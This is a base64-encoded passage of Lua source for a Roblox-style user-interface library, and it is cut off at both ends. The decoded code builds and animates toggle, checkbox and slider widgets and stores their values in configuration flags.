CAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJpbmxpbmUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAxLCAtMik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlck1vZGUgPSBFbnVtLkJvcmRlck1vZGUuSW5zZXQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMSwgMCwgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHRoZW1lcy5wcmVzZXQuYWNjZW50CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAiaW5saW5lIiBdLCAiYWNjZW50IiwgIkJhY2tncm91bmRDb2xvcjMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5KQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDIxMSwgMjExLCAyMTEpKSwgcmdia2V5KDEsIHJnYigyMTEsIDIxMSwgMjExKSl9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImNpcmNsZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJpbmxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAtMTQsIDAsIDIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMTIsIDAsIDEyKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImNpcmNsZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgICAgIC0tICAgICAgICAgICAgICAgIAogICAgICAgICAgICBlbmQ7CiAgICAgICAgICAgIAogICAgICAgICAgICBmdW5jdGlvbiBjZmcuc2V0KGJvb2wpCiAgICAgICAgICAgICAgICBpZiBjZmcudHlwZSA9PSAiY2hlY2tib3giIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInRpY2siIF0sIHtSb3RhdGlvbiA9IGJvb2wgYW5kIDAgb3IgNDUsIEltYWdlVHJhbnNwYXJlbmN5ID0gYm9vbCBhbmQgMCBvciAxfSkKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXSwge0JhY2tncm91bmRDb2xvcjMgPSBib29sIGFuZCB0aGVtZXMucHJlc2V0LmFjY2VudCBvciByZ2IoNjcsIDY3LCA2OCl9KQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJvdXRsaW5lIiBdLCB7QmFja2dyb3VuZENvbG9yMyA9IGJvb2wgYW5kIHRoZW1lcy5wcmVzZXQuYWNjZW50IG9yIHJnYigyMiwgMjIsIDI0KX0pCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInRvZ2dsZV9idXR0b24iIF0sIHtCYWNrZ3JvdW5kQ29sb3IzID0gYm9vbCBhbmQgdGhlbWVzLnByZXNldC5hY2NlbnQgb3IgcmdiKDU4LCA1OCwgNjIpfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkKQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJpbmxpbmUiIF0sIHtCYWNrZ3JvdW5kQ29sb3IzID0gYm9vbCBhbmQgdGhlbWVzLnByZXNldC5hY2NlbnQgb3IgcmdiKDUwLCA1MCwgNTApfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkKQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJjaXJjbGUiIF0sIHtCYWNrZ3JvdW5kQ29sb3IzID0gYm9vbCBhbmQgcmdiKDI1NSwgMjU1LCAyNTUpIG9yIHJnYig4NiwgODYsIDg4KSwgUG9zaXRpb24gPSBib29sIGFuZCBkaW0yKDEsIC0xNCwgMCwgMikgb3IgZGltMigwLCAyLCAwLCAyKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCkKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGNmZy5lbmFibGVkID0gYm9vbAogICAgICAgICAgICAgICAgY2ZnLmNhbGxiYWNrKGJvb2wpCgogICAgICAgICAgICAgICAgaWYgY2ZnLmZvbGRpbmcgdGhlbiAKICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5WaXNpYmxlID0gYm9vbAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gYm9vbAogICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIAogICAgICAgICAgICBpdGVtc1sgInRvZ2dsZSIgXS5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGNmZy5lbmFibGVkID0gbm90IGNmZy5lbmFibGVkIAogICAgICAgICAgICAgICAgY2ZnLnNldChjZmcuZW5hYmxlZCkKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaXRlbXNbICJ0b2dnbGVfYnV0dG9uIiBdLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgY2ZnLmVuYWJsZWQgPSBub3QgY2ZnLmVuYWJsZWQgCiAgICAgICAgICAgICAgICBjZmcuc2V0KGNmZy5lbmFibGVkKQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBjZmcuc2VwZXJhdG9yIHRoZW4gLS0gb2sgYnJvIG15IGx1YSBlaXRoZXIgc3Vja3Mgb3IgdGhpcyB3YXMgYSBwYWluIGluIHRoZSBhc3MgdG8gbWFrZSAoc2ltcGxlIGlmIHN0YXRlbWVudCBhc3dlbGwg8J+SlCkKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAxKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzYsIDM2LCAzNykKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGNmZy5zZXQoY2ZnLmRlZmF1bHQpCgogICAgICAgICAgICBjb25maWdfZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLnNldAoKICAgICAgICAgICAgcmV0dXJuIHNldG1ldGF0YWJsZShjZmcsIGxpYnJhcnkpCiAgICAgICAgZW5kIAogICAgICAgIAogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6c2xpZGVyKG9wdGlvbnMpIAogICAgICAgICAgICBsb2NhbCBjZmcgPSB7CiAgICAgICAgICAgICAgICBuYW1lID0gb3B0aW9ucy5uYW1lIG9yIG5pbCwKICAgICAgICAgICAgICAgIHN1ZmZpeCA9IG9wdGlvbnMuc3VmZml4IG9yICIiLAogICAgICAgICAgICAgICAgZmxhZyA9IG9wdGlvbnMuZmxhZyBvciBsaWJyYXJ5Om5leHRfZmxhZygpLAogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBvcHRpb25zLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kLCAKICAgICAgICAgICAgICAgIGluZm8gPSBvcHRpb25zLmluZm8gb3IgbmlsOyAKCiAgICAgICAgICAgICAgICAtLSB2YWx1ZSBzZXR0aW5ncwogICAgICAgICAgICAgICAgbWluID0gb3B0aW9ucy5taW4gb3Igb3B0aW9ucy5taW5pbXVtIG9yIDAsCiAgICAgICAgICAgICAgICBtYXggPSBvcHRpb25zLm1heCBvciBvcHRpb25zLm1heGltdW0gb3IgMTAwLAogICAgICAgICAgICAgICAgaW50ZXJ2YWxzID0gb3B0aW9ucy5pbnRlcnZhbCBvciBvcHRpb25zLmRlY2ltYWwgb3IgMSwKICAgICAgICAgICAgICAgIGRlZmF1bHQgPSBvcHRpb25zLmRlZmF1bHQgb3IgMTAsCiAgICAgICAgICAgICAgICB2YWx1ZSA9IG9wdGlvbnMuZGVmYXVsdCBvciAxMCwgCiAgICAgICAgICAgICAgICBzZXBlcmF0b3IgPSBvcHRpb25zLnNlcGVyYXRvciBvciBvcHRpb25zLlNlcGVyYXRvciBvciBmYWxzZTsKCiAgICAgICAgICAgICAgICBkcmFnZ2luZyA9IGZhbHNlLAogICAgICAgICAgICAgICAgaXRlbXMgPSB7fQogICAgICAgICAgICB9IAoKICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLmRlZmF1bHQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbwogICAgICAgICAgICAgICAgaXRlbXNbICJzbGlkZXJfb2JqZWN0IiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9IGNmZy5uYW1lOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2xpZGVyX29iamVjdCIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgY2ZnLmluZm8gdGhlbiAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImluZm8iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMTMwLCAxMzAsIDEzMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyYXBwZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2xpZGVyX29iamVjdCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA1LCAwLCAzNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0xMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YWTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm5hbWUiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzbGlkZXJfb2JqZWN0IiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA0LCAwLCAyMyk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDEyKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CiAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJzbGlkZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC00LCAwLCA0KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigzMywgMzMsIDM1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2xpZGVyIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJmaWxsIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzbGlkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAuNSwgMCwgMCwgNCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gdGhlbWVzLnByZXNldC5hY2NlbnQKICAgICAgICAgICAgICAgIH0pOyAgbGlicmFyeTphcHBseV90aGVtZShpdGVtc1sgImZpbGwiIF0sICJhY2NlbnQiLCAiQmFja2dyb3VuZENvbG9yMyIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImZpbGwiIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDk5OSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgImNpcmNsZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLjUsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJmaWxsIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAxMiwgMCwgMTIpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNDQsIDI0NCwgMjQ0KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY2lyY2xlIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJ2YWx1ZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Myk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiNTAlIjsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInNsaWRlcl9vYmplY3QiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDYsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5SaWdodDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidmFsdWUiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICB9KTsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5jaGFuZ2V0ZXh0KHRleHQpCiAgICAgICAgICAgICAgICBpdGVtc1snbmFtZSddLlRleHQgPSB0ZXh0CiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXQodmFsdWUpCiAgICAgICAgICAgICAgICBjZmcudmFsdWUgPSBjbGFtcChsaWJyYXJ5OnJvdW5kKHZhbHVlLCBjZmcuaW50ZXJ2YWxzKSwgY2ZnLm1pbiwgY2ZnLm1heCkKCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiZmlsbCIgXSwge1NpemUgPSBkaW0yKChjZmcudmFsdWUgLSBjZmcubWluKSAvIChjZmcubWF4IC0gY2ZnLm1pbiksIGNmZy52YWx1ZSA9PSBjZmcubWluIGFuZCAwIG9yIC00LCAwLCAyKX0sIEVudW0uRWFzaW5nU3R5bGUuTGluZWFyLCAwLjA1KQogICAgICAgICAgICAgICAgaXRlbXNbICJ2YWx1ZSIgXS5UZXh0ID0gdG9zdHJpbmcoY2ZnLnZhbHVlKSAuLiBjZmcuc3VmZml4CgogICAgICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLnZhbHVlCiAgICAgICAgICAgICAgICBjZmcuY2FsbGJhY2soZmxh